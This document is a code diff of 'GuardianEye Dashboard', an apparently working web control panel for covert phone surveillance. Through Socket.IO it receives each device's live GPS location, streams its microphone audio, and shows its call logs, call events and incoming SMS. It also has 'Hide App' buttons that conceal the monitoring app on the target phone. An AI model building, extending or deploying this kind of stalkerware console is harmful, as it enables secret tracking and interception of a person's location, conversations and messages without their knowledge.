@@ -1,112 +1,256 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
+  <meta charset="UTF-8">
   <title>GuardianEye Dashboard</title>
   <script src="/socket.io/socket.io.js"></script>
+
+  <!-- Leaflet Map -->
+  <link rel="stylesheet" href="https://unpkg.com/leaflet/dist/leaflet.css"/>
+  <script src="https://unpkg.com/leaflet/dist/leaflet.js"></script>
+
   <style>
     body {
       font-family: Arial, sans-serif;
-      background: #f4f6f9;
       margin: 20px;
+      background: #f4f6f9;
     }
-    h1 {
+    h1, h2 {
       text-align: center;
-      color: #007bff;
     }
-    .device {
+    .device-section {
+      margin: 30px 0;
+      padding: 20px;
       background: #fff;
       border-radius: 12px;
       box-shadow: 0 2px 6px rgba(0,0,0,0.2);
-      margin: 15px 0;
-      padding: 15px;
     }
-    .device h2 {
-      margin: 0;
-      color: #333;
-    }
-    .device p {
-      margin: 5px 0;
-    }
-    audio {
+    .map {
+      height: 400px;
       width: 100%;
-      margin-top: 8px;
+      margin-top: 10px;
+      border-radius: 12px;
     }
-    .disconnected {
-      opacity: 0.5;
+    .eventList {
+      margin-top: 15px;
+      padding: 10px;
+      background: #fff;
+      border: 1px solid #ddd;
+      border-radius: 8px;
+      max-height: 200px;
+      overflow-y: auto;
+    }
+    table {
+      width: 100%;
+      margin-top: 15px;
+      border-collapse: collapse;
+      background: #fff;
+    }
+    th, td {
+      border: 1px solid #ddd;
+      padding: 8px;
+      text-align: center;
+    }
+    th {
+      background: #007bff;
+      color: #fff;
+    }
+    tr:nth-child(even) {
+      background: #f9f9f9;
+    }
+    .control-buttons {
+      text-align: center;
+      margin: 20px 0;
+    }
+    button {
+      margin: 5px;
+      padding: 8px 16px;
+      border: none;
+      border-radius: 6px;
+      cursor: pointer;
+      background: #007bff;
+      color: #fff;
     }
   </style>
 </head>
 <body>
   <h1>GuardianEye Dashboard</h1>
-  <div id="devices"></div>
+  <div id="devicesContainer"></div>
 
   <script>
     const socket = io();
-    const devices = {}; // Track created UI blocks
+    const devicesContainer = document.getElementById("devicesContainer");
 
-    function createDeviceUI(deviceId, deviceName) {
-      if (devices[deviceId]) return; // already exists
+    const devices = {}; // store device UI + state
 
-      const div = document.createElement("div");
-      div.className = "device";
-      div.id = "device-" + deviceId;
+    socket.on("connect", () => {
+      console.log("Connected to server");
+      socket.emit("listener-register");
+    });
 
-      div.innerHTML = `
-        <h2>${deviceName} (${deviceId})</h2>
-        <p id="status-${deviceId}">🟢 Connected</p>
-        <p id="loc-${deviceId}">📍 Location: waiting...</p>
-        <audio id="audio-${deviceId}" controls autoplay></audio>
-        <p id="sms-${deviceId}">✉ SMS: none</p>
-        <p id="call-${deviceId}">📞 Call: none</p>
+    socket.on("device-registered", (deviceId) => {
+      if (devices[deviceId]) return;
+
+      // Create device section
+      const section = document.createElement("div");
+      section.className = "device-section";
+      section.innerHTML = `
+        <h2>📱 Device: ${deviceId}</h2>
+        <div id="status-${deviceId}">🔴 Disconnected</div>
+
+        <div class="control-buttons">
+          <button onclick="sendCommand('${deviceId}','hide-app-server')">👻 Hide App</button>
+          <button onclick="sendCommand('${deviceId}','show-app-server')">📲 Show App</button>
+        </div>
+
+        <h3>Live Map</h3>
+        <div id="map-${deviceId}" class="map"></div>
+
+        <h3>Live Audio</h3>
+        <button onclick="startAudio('${deviceId}')">▶ Start Listening</button>
+        <p id="audioStatus-${deviceId}">Click the button to start audio.</p>
+
+        <h3>📋 Call Logs</h3>
+        <table>
+          <thead>
+            <tr><th>Number</th><th>Type</th><th>Date</th><th>Duration (s)</th></tr>
+          </thead>
+          <tbody id="callLogsBody-${deviceId}">
+            <tr><td colspan="4">Waiting...</td></tr>
+          </tbody>
+        </table>
+
+        <h3>📞 Call Events</h3>
+        <div id="callEventsList-${deviceId}" class="eventList"><div>Waiting...</div></div>
+
+        <h3>📨 SMS Messages</h3>
+        <div id="smsList-${deviceId}" class="eventList"><div>Waiting...</div></div>
       `;
+      devicesContainer.appendChild(section);
 
-      document.getElementById("devices").appendChild(div);
-      devices[deviceId] = true;
+      // Initialize map
+      const map = L.map(`map-${deviceId}`).setView([20, 78], 5);
+      L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
+        attribution: '© OpenStreetMap contributors'
+      }).addTo(map);
+
+      devices[deviceId] = {
+        map,
+        marker: null,
+        audioContext: null,
+        audioQueue: [],
+        isPlaying: false
+      };
+
+      document.getElementById(`status-${deviceId}`).innerText = "🟢 Connected";
+    });
+
+    // Send command to specific device
+    function sendCommand(deviceId, cmd) {
+      socket.emit(cmd, { deviceId });
     }
 
-    socket.on("device-registered", (data) => {
-      createDeviceUI(data.deviceId, data.deviceName);
-    });
-
-    socket.on("device-disconnected", (data) => {
-      const div = document.getElementById("device-" + data.deviceId);
-      if (div) div.classList.add("disconnected");
-      const status = document.getElementById("status-" + data.deviceId);
-      if (status) status.innerText = "🔴 Disconnected";
-    });
-
+    // === LOCATION ===
     socket.on("location-update", (data) => {
-      const { deviceId, lat, lng } = data;
-      const loc = document.getElementById("loc-" + deviceId);
-      if (loc) loc.innerText = `📍 Location: ${lat}, ${lng}`;
-    });
+      const device = devices[data.deviceId];
+      if (!device) return;
+      if (!data.lat || !data.lng) return;
 
-    socket.on("sms-received", (data) => {
-      const { deviceId, number, body } = data;
-      const sms = document.getElementById("sms-" + deviceId);
-      if (sms) sms.innerText = `✉ SMS from ${number}: ${body}`;
-    });
-
-    socket.on("call-event", (data) => {
-      const { deviceId, number, state } = data;
-      const call = document.getElementById("call-" + deviceId);
-      if (call) call.innerText = `📞 ${state}: ${number}`;
-    });
-
-    socket.on("audio-chunk", (data) => {
-      const { deviceId, chunk } = data;
-      const audio = document.getElementById("audio-" + deviceId);
-      if (!audio) return;
-
-      const byteCharacters = atob(chunk.replace(/\n/g, ""));
-      const byteNumbers = new Array(byteCharacters.length);
-      for (let i = 0; i < byteCharacters.length; i++) {
-        byteNumbers[i] = byteCharacters.charCodeAt(i);
+      if (!device.marker) {
+        device.marker = L.marker([data.lat, data.lng]).addTo(device.map);
+      } else {
+        device.marker.setLatLng([data.lat, data.lng]);
       }
-      const byteArray = new Uint8Array(byteNumbers);
-      const blob = new Blob([byteArray], { type: "audio/wav" });
-      audio.src = URL.createObjectURL(blob);
+      device.map.setView([data.lat, data.lng], 15);
+    });
+
+    // === AUDIO ===
+    function startAudio(deviceId) {
+      const device = devices[deviceId];
+      if (!device.audioContext) {
+        device.audioContext = new (window.AudioContext || window.webkitAudioContext)();
+        document.getElementById(`audioStatus-${deviceId}`).innerText = "🎧 Listening...";
+      }
+      if (!device.isPlaying) playNextChunk(deviceId);
+    }
+
+    function playNextChunk(deviceId) {
+      const device = devices[deviceId];
+      if (!device.audioQueue.length || !device.audioContext) {
+        device.isPlaying = false;
+        return;
+      }
+      const float32Array = device.audioQueue.shift();
+      const audioBuffer = device.audioContext.createBuffer(1, float32Array.length, 16000);
+      audioBuffer.copyToChannel(float32Array, 0);
+
+      const bufferSource = device.audioContext.createBufferSource();
+      bufferSource.buffer = audioBuffer;
+      bufferSource.connect(device.audioContext.destination);
+      bufferSource.onended = () => playNextChunk(deviceId);
+      bufferSource.start();
+      device.isPlaying = true;
+    }
+
+    socket.on("audio-chunk", ({ deviceId, base64Chunk }) => {
+      const device = devices[deviceId];
+      if (!device || !device.audioContext) return;
+
+      const byteString = atob(base64Chunk.replace(/\n/g, ''));
+      const buffer = new Uint8Array(byteString.length);
+      for (let i = 0; i < byteString.length; i++) buffer[i] = byteString.charCodeAt(i);
+
+      const float32Array = new Float32Array(buffer.length / 2);
+      for (let i = 0; i < float32Array.length; i++) {
+        let int16 = (buffer[i*2 +1] << 8) | buffer[i*2];
+        if (int16 >= 32768) int16 -= 65536;
+        float32Array[i] = int16 / 32768;
+      }
+
+      device.audioQueue.push(float32Array);
+      if (!device.isPlaying) playNextChunk(deviceId);
+    });
+
+    // === CALL LOGS ===
+    socket.on("call-logs", ({ deviceId, logs }) => {
+      const tbody = document.getElementById(`callLogsBody-${deviceId}`);
+      if (!tbody) return;
+
+      tbody.innerHTML = "";
+      if (!logs || logs.length === 0) {
+        tbody.innerHTML = "<tr><td colspan='4'>No call logs available</td></tr>";
+        return;
+      }
+      logs.forEach(log => {
+        const row = document.createElement("tr");
+        row.innerHTML = `
+          <td>${log.number || "Unknown"}</td>
+          <td>${log.type}</td>
+          <td>${new Date(log.date).toLocaleString()}</td>
+          <td>${log.duration}</td>
+        `;
+        tbody.appendChild(row);
+      });
+    });
+
+    // === CALL EVENTS ===
+    socket.on("call-event", ({ deviceId, event }) => {
+      const list = document.getElementById(`callEventsList-${deviceId}`);
+      if (!list) return;
+
+      const div = document.createElement("div");
+      div.innerText = `[${new Date().toLocaleTimeString()}] ${event.state} - ${event.number || "Unknown"}`;
+      list.prepend(div);
+    });
+
+    // === SMS ===
+    socket.on("sms-received", ({ deviceId, sms }) => {
+      const list = document.getElementById(`smsList-${deviceId}`);
+      if (!list) return;
+
+      const div = document.createElement("div");
+      div.innerText = `[${new Date().toLocaleTimeString()}] ${sms.number || "Unknown"}: ${sms.body}`;
+      list.prepend(div);
     });
   </script>
 </body>
